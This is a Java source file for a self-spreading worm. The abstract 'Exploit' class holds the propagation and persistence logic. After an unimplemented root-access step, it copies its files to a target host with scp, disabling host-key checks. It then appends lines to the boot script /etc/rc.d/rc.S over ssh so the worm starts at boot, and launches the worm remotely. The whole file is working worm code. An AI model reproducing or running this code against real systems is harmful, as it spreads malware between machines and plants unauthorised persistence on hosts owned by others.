
public abstract class Exploit {
	
	String dusr;
	String[] file;
	String ip;
	String prjname;
	
	public Exploit(String user, String[] filepath, String IP){
		ip = IP;
		file = filepath;
		dusr = user;
		prjname = "Propagation";
	}
	
	abstract protected boolean getRootAccess();
	
	private boolean copyToTarget(){
		
		Runtime runner = Runtime.getRuntime();
		
		
		
		Process proc;
		try{
			for(int i = 0; i < file.length; i++){
				String[] cmd= {"scp", "-o StrictHostKeyChecking=no", file[i], dusr+"@"+ip+":/etc/rc.d/"};
				proc = runner.exec(cmd);
				proc.waitFor();
			}
			 
		}catch(Exception e){
			return false;
		}
		
		
		return true;
	}
	
	private boolean begin(){
		Runtime runner = Runtime.getRuntime();
		
		
		Process proc;
	
		
		try{
			String runWorm = "/usr/lib/java/bin/java " + prjname;
			String runAtBootTime = "echo " + runWorm + " >> /etc/rc.d/rc.S";
			String[] cmd2 = new String[]{"/usr/bin/ssh", dusr+"@"+ip, "echo \"cd /etc/rc.d/\" >> /etc/rc.d/rc.S"};
			String[] cmd = new String[]{"/usr/bin/ssh", dusr+"@"+ip, runAtBootTime};
			
			proc = runner.exec(cmd2);
			proc.waitFor();
			
			proc = runner.exec(cmd);
			proc.waitFor();
			
			cmd = new String[]{"/usr/bin/ssh", dusr+"@"+ip, "cd /etc/rc.d/; " + runWorm};
			
			proc = runner.exec(cmd);
			
			
		}catch(Exception e){
			return false;
		}
		
		try{
			Thread.sleep(5000);
			proc.destroy();
		}catch(Exception e){
			return false;
		}
		
		
		return true;
	}
	
	public boolean exploit(){

		//gain root access (and edit the config to run this at boot time)
		if(!getRootAccess()){
			System.err.println("failed to gain root access");
			return false;
		}
		
		System.out.println("\n");
		
		//copy itself to the target
		if(!copyToTarget()){
			System.err.println("failed to copy self to the target");
			return false;
		}
		
		if(!begin()){
			System.err.println("failed to start worm");
			return false;
		}
		
		return true;
	}
}
